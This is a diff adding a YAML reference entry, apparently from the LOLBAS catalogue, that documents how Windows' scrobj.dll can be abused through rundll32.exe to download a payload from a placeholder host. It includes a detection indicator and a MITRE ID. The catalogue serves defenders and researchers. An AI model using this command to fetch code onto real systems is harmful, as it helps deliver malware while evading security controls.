@@ -1,0 +1,23 @@
+---
+Name: Scrobj.dll
+Description: Windows Script Component Runtime
+Author: Eral4m
+Created: 2021-01-07
+Commands:
+  - Command: rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib http://x.x.x.x/payload.exe
+    Description: Once executed, rundll32.exe will download the file at the URL in the command to %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE\<random>\payload[1].exe.
+    Usecase: Download file from remote location.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+Full_Path:
+  - Path: c:\windows\system32\scrobj.dll
+  - Path: c:\windows\syswow64\scrobj.dll
+Detection:
+  - IOC: Execution of rundll32.exe with 'GenerateTypeLib' and a protocol handler ('://') on the command line
+Resources:
+  - Link: https://twitter.com/eral4m/status/1479106975967240209
+Acknowledgement:
+  - Person: Eral4m
+    Handle: '@eral4m'
